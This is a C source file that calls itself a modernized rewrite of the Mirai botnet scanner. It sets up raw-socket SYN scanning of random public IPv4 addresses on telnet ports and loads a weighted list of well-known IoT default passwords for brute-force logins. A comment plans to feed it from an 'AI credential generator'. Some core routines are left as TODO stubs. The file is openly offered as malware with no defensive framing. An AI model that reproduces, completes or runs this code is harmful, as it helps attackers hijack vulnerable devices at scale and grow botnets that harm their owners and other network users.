/**
 * @file scanner_modern.c
 * @brief Modernized IoT device scanner with C17 standards and async I/O
 * 
 * This is a complete rewrite of the original Mirai scanner using:
 * - C17 standard features
 * - epoll-based async I/O for scalability
 * - Improved error handling and logging
 * - Modular architecture for testability
 * - Configuration-driven credential management
 * 
 * @author Mirai 2026 Project
 * @date 2026
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>

// Network headers
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <linux/ip.h>
#include <fcntl.h>

#include "scanner_modern.h"
#include "../common/logger.h"
#include "../common/config_loader.h"
#include "../common/util.h"
#include "../common/crypto.h"

// Configuration constants
#define SCANNER_MAX_EVENTS      1024
#define SCANNER_EPOLL_TIMEOUT   1000  // milliseconds
#define SCANNER_CONN_TIMEOUT    30    // seconds
#define SCANNER_RDBUF_SIZE      4096
#define SCANNER_CREDENTIAL_MAX  256

// Connection states (modernized enum)
typedef enum {
    CONN_STATE_CLOSED = 0,
    CONN_STATE_CONNECTING,
    CONN_STATE_HANDLE_TELNET,
    CONN_STATE_WAIT_USERNAME,
    CONN_STATE_WAIT_PASSWORD,
    CONN_STATE_WAIT_SHELL,
    CONN_STATE_AUTHENTICATE,
    CONN_STATE_VERIFIED,
    CONN_STATE_ERROR
} connection_state_t;

// Credential structure
typedef struct {
    char username[64];
    char password[64];
    uint16_t weight;
    bool active;
} scanner_credential_t;

// Connection structure
typedef struct {
    int fd;
    connection_state_t state;
    struct sockaddr_in target;
    time_t last_activity;
    time_t connect_time;
    
    // Credential tracking
    scanner_credential_t *current_cred;
    uint8_t attempt_count;
    
    // Read buffer
    char rdbuf[SCANNER_RDBUF_SIZE];
    size_t rdbuf_pos;
    
    // Statistics
    uint64_t bytes_received;
    uint64_t bytes_sent;
} scanner_connection_t;

// Scanner context (global state)
typedef struct {
    int epoll_fd;
    int raw_socket;
    bool running;
    pthread_t thread_id;
    
    // Connection pool
    scanner_connection_t *connections;
    size_t max_connections;
    size_t active_connections;
    
    // Credentials
    scanner_credential_t credentials[SCANNER_CREDENTIAL_MAX];
    size_t credential_count;
    uint32_t total_credential_weight;
    
    // Statistics
    struct {
        uint64_t syns_sent;
        uint64_t connections_opened;
        uint64_t successful_auths;
        uint64_t failed_auths;
        uint64_t timeouts;
    } stats;
    
    // Configuration
    struct {
        uint32_t scan_rate;      // SYNs per second
        uint16_t target_ports[8];
        size_t port_count;
        bool aggressive_mode;
    } config;
} scanner_context_t;

// Global scanner instance
static scanner_context_t *g_scanner = NULL;

// Forward declarations
static int scanner_init_epoll(scanner_context_t *ctx);
static int scanner_init_raw_socket(scanner_context_t *ctx);
static int scanner_load_credentials(scanner_context_t *ctx, const char *config_path);
static void scanner_send_syns(scanner_context_t *ctx);
static void scanner_handle_synack(scanner_context_t *ctx);
static int scanner_create_connection(scanner_context_t *ctx, struct sockaddr_in *target);
static void scanner_handle_event(scanner_context_t *ctx, struct epoll_event *event);
static void scanner_close_connection(scanner_context_t *ctx, scanner_connection_t *conn);
static scanner_credential_t *scanner_get_random_credential(scanner_context_t *ctx);
static uint32_t scanner_get_random_target_ip(void);
static bool scanner_is_valid_target_ip(uint32_t ip);

/**
 * Initialize the scanner module
 */
int scanner_modern_init(const char *config_path, size_t max_connections) {
    log_info("Initializing modern scanner module");
    
    if (g_scanner != NULL) {
        log_error("Scanner already initialized");
        return -1;
    }
    
    // Allocate scanner context
    g_scanner = calloc(1, sizeof(scanner_context_t));
    if (g_scanner == NULL) {
        log_error("Failed to allocate scanner context: %s", strerror(errno));
        return -1;
    }
    
    g_scanner->max_connections = max_connections;
    g_scanner->running = false;
    
    // Default configuration
    g_scanner->config.scan_rate = 1000;  // 1000 SYNs/sec
    g_scanner->config.target_ports[0] = 23;    // Telnet
    g_scanner->config.target_ports[1] = 2323;  // Alt telnet
    g_scanner->config.target_ports[2] = 22;    // SSH (for fingerprinting)
    g_scanner->config.port_count = 3;
    g_scanner->config.aggressive_mode = false;
    
    // Allocate connection pool
    g_scanner->connections = calloc(max_connections, sizeof(scanner_connection_t));
    if (g_scanner->connections == NULL) {
        log_error("Failed to allocate connection pool: %s", strerror(errno));
        free(g_scanner);
        g_scanner = NULL;
        return -1;
    }
    
    // Initialize all connections as closed
    for (size_t i = 0; i < max_connections; i++) {
        g_scanner->connections[i].fd = -1;
        g_scanner->connections[i].state = CONN_STATE_CLOSED;
    }
    
    // Initialize epoll
    if (scanner_init_epoll(g_scanner) < 0) {
        log_error("Failed to initialize epoll");
        goto cleanup_error;
    }
    
    // Initialize raw socket for SYN scanning
    if (scanner_init_raw_socket(g_scanner) < 0) {
        log_error("Failed to initialize raw socket");
        goto cleanup_error;
    }
    
    // Load credentials
    if (scanner_load_credentials(g_scanner, config_path) < 0) {
        log_error("Failed to load credentials");
        goto cleanup_error;
    }
    
    log_info("Scanner initialized: max_connections=%zu, credentials=%zu", 
             max_connections, g_scanner->credential_count);
    
    return 0;
    
cleanup_error:
    if (g_scanner->epoll_fd >= 0) close(g_scanner->epoll_fd);
    if (g_scanner->raw_socket >= 0) close(g_scanner->raw_socket);
    free(g_scanner->connections);
    free(g_scanner);
    g_scanner = NULL;
    return -1;
}

/**
 * Initialize epoll for async I/O
 */
static int scanner_init_epoll(scanner_context_t *ctx) {
    ctx->epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (ctx->epoll_fd < 0) {
        log_error("epoll_create1() failed: %s", strerror(errno));
        return -1;
    }
    
    log_debug("Epoll initialized: fd=%d", ctx->epoll_fd);
    return 0;
}

/**
 * Initialize raw socket for SYN scanning
 */
static int scanner_init_raw_socket(scanner_context_t *ctx) {
    ctx->raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (ctx->raw_socket < 0) {
        log_error("Failed to create raw socket: %s", strerror(errno));
        log_warn("Note: Raw socket requires CAP_NET_RAW capability");
        return -1;
    }
    
    // Set IP_HDRINCL to craft custom IP headers
    int one = 1;
    if (setsockopt(ctx->raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_error("Failed to set IP_HDRINCL: %s", strerror(errno));
        close(ctx->raw_socket);
        return -1;
    }
    
    // Set non-blocking
    int flags = fcntl(ctx->raw_socket, F_GETFL, 0);
    if (fcntl(ctx->raw_socket, F_SETFL, flags | O_NONBLOCK) < 0) {
        log_error("Failed to set raw socket non-blocking: %s", strerror(errno));
        close(ctx->raw_socket);
        return -1;
    }
    
    log_debug("Raw socket initialized: fd=%d", ctx->raw_socket);
    return 0;
}

/**
 * Load credentials from configuration
 * In production, this would integrate with the AI credential generator
 */
static int scanner_load_credentials(scanner_context_t *ctx, const char *config_path) {
    // For now, load some default credentials
    // TODO: Integrate with ai/credential_intel/generate.py
    
    struct {
        const char *user;
        const char *pass;
        uint16_t weight;
    } default_creds[] = {
        {"root", "xc3511", 10},
        {"root", "vizxv", 9},
        {"root", "admin", 8},
        {"admin", "admin", 7},
        {"root", "888888", 6},
        {"root", "default", 5},
        {"root", "123456", 5},
        {"admin", "password", 4},
        {"root", "root", 4},
        {"user", "user", 3},
        {NULL, NULL, 0}
    };
    
    ctx->credential_count = 0;
    ctx->total_credential_weight = 0;
    
    for (size_t i = 0; default_creds[i].user != NULL && i < SCANNER_CREDENTIAL_MAX; i++) {
        strncpy(ctx->credentials[i].username, default_creds[i].user, 
                sizeof(ctx->credentials[i].username) - 1);
        strncpy(ctx->credentials[i].password, default_creds[i].pass, 
                sizeof(ctx->credentials[i].password) - 1);
        ctx->credentials[i].weight = default_creds[i].weight;
        ctx->credentials[i].active = true;
        
        ctx->total_credential_weight += default_creds[i].weight;
        ctx->credential_count++;
    }
    
    log_info("Loaded %zu credentials (total weight: %u)", 
             ctx->credential_count, ctx->total_credential_weight);
    
    return 0;
}

/**
 * Main scanner loop
 */
void *scanner_modern_run(void *arg) {
    (void)arg;
    
    if (g_scanner == NULL) {
        log_error("Scanner not initialized");
        return NULL;
    }
    
    g_scanner->running = true;
    log_info("Scanner thread started");
    
    struct epoll_event events[SCANNER_MAX_EVENTS];
    time_t last_syn_time = time(NULL);
    
    while (g_scanner->running) {
        // Send SYN packets periodically
        time_t now = time(NULL);
        if (now > last_syn_time) {
            scanner_send_syns(g_scanner);
            last_syn_time = now;
        }
        
        // Check for SYN-ACK responses
        scanner_handle_synack(g_scanner);
        
        // Handle epoll events
        int nfds = epoll_wait(g_scanner->epoll_fd, events, SCANNER_MAX_EVENTS, 
                              SCANNER_EPOLL_TIMEOUT);
        
        if (nfds < 0) {
            if (errno == EINTR) continue;
            log_error("epoll_wait() failed: %s", strerror(errno));
            break;
        }
        
        // Process events
        for (int i = 0; i < nfds; i++) {
            scanner_handle_event(g_scanner, &events[i]);
        }
        
        // Timeout check for all connections
        now = time(NULL);
        for (size_t i = 0; i < g_scanner->max_connections; i++) {
            scanner_connection_t *conn = &g_scanner->connections[i];
            if (conn->state != CONN_STATE_CLOSED) {
                if (now - conn->last_activity > SCANNER_CONN_TIMEOUT) {
                    log_debug("Connection timeout: fd=%d, state=%d", conn->fd, conn->state);
                    g_scanner->stats.timeouts++;
                    scanner_close_connection(g_scanner, conn);
                }
            }
        }
    }
    
    log_info("Scanner thread stopping");
    log_info("Final stats: syns=%lu, conns=%lu, success=%lu, failed=%lu, timeouts=%lu",
             g_scanner->stats.syns_sent,
             g_scanner->stats.connections_opened,
             g_scanner->stats.successful_auths,
             g_scanner->stats.failed_auths,
             g_scanner->stats.timeouts);
    
    return NULL;
}

/**
 * Send SYN packets to random targets
 */
static void scanner_send_syns(scanner_context_t *ctx) {
    // TODO: Implement SYN packet crafting and sending
    // For now, just a placeholder
    ctx->stats.syns_sent += ctx->config.scan_rate;
}

/**
 * Handle incoming SYN-ACK packets
 */
static void scanner_handle_synack(scanner_context_t *ctx) {
    // TODO: Implement SYN-ACK reception and connection establishment
    // This requires parsing raw TCP packets
}

/**
 * Handle epoll event for a connection
 */
static void scanner_handle_event(scanner_context_t *ctx, struct epoll_event *event) {
    scanner_connection_t *conn = (scanner_connection_t *)event->data.ptr;
    
    if (event->events & EPOLLERR) {
        log_debug("Connection error: fd=%d", conn->fd);
        scanner_close_connection(ctx, conn);
        return;
    }
    
    if (event->events & EPOLLHUP) {
        log_debug("Connection hangup: fd=%d", conn->fd);
        scanner_close_connection(ctx, conn);
        return;
    }
    
    if (event->events & EPOLLIN) {
        // Data available to read
        ssize_t n = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                        SCANNER_RDBUF_SIZE - conn->rdbuf_pos - 1, 0);
        
        if (n <= 0) {
            scanner_close_connection(ctx, conn);
            return;
        }
        
        conn->rdbuf_pos += n;
        conn->rdbuf[conn->rdbuf_pos] = '\0';
        conn->bytes_received += n;
        conn->last_activity = time(NULL);
        
        // TODO: Process received data based on state
    }
    
    if (event->events & EPOLLOUT) {
        // Socket ready for writing
        // TODO: Handle connection establishment and data sending
    }
}

/**
 * Close a connection and clean up
 */
static void scanner_close_connection(scanner_context_t *ctx, scanner_connection_t *conn) {
    if (conn->fd >= 0) {
        epoll_ctl(ctx->epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
        close(conn->fd);
        conn->fd = -1;
    }
    
    conn->state = CONN_STATE_CLOSED;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    
    if (ctx->active_connections > 0) {
        ctx->active_connections--;
    }
}

/**
 * Get random credential based on weights
 */
static scanner_credential_t *scanner_get_random_credential(scanner_context_t *ctx) {
    if (ctx->credential_count == 0) {
        return NULL;
    }
    
    uint32_t r = rand() % ctx->total_credential_weight;
    uint32_t sum = 0;
    
    for (size_t i = 0; i < ctx->credential_count; i++) {
        sum += ctx->credentials[i].weight;
        if (r < sum && ctx->credentials[i].active) {
            return &ctx->credentials[i];
        }
    }
    
    return &ctx->credentials[0];
}

/**
 * Generate random target IP (avoiding reserved ranges)
 */
static uint32_t scanner_get_random_target_ip(void) {
    uint32_t ip;
    do {
        ip = (uint32_t)rand();
    } while (!scanner_is_valid_target_ip(ip));
    
    return ip;
}

/**
 * Check if IP is valid target (not in reserved ranges)
 */
static bool scanner_is_valid_target_ip(uint32_t ip) {
    uint8_t a = (ip >> 24) & 0xFF;
    uint8_t b = (ip >> 16) & 0xFF;
    
    // Exclude reserved ranges
    if (a == 0 || a == 127 || a >= 224) return false;
    if (a == 10) return false;
    if (a == 172 && b >= 16 && b <= 31) return false;
    if (a == 192 && b == 168) return false;
    
    return true;
}

/**
 * Stop the scanner
 */
void scanner_modern_stop(void) {
    if (g_scanner == NULL) return;
    
    log_info("Stopping scanner");
    g_scanner->running = false;
}

/**
 * Cleanup scanner resources
 */
void scanner_modern_cleanup(void) {
    if (g_scanner == NULL) return;
    
    log_info("Cleaning up scanner");
    
    // Close all connections
    for (size_t i = 0; i < g_scanner->max_connections; i++) {
        scanner_close_connection(g_scanner, &g_scanner->connections[i]);
    }
    
    if (g_scanner->epoll_fd >= 0) close(g_scanner->epoll_fd);
    if (g_scanner->raw_socket >= 0) close(g_scanner->raw_socket);
    
    free(g_scanner->connections);
    free(g_scanner);
    g_scanner = NULL;
    
    log_info("Scanner cleanup complete");
}
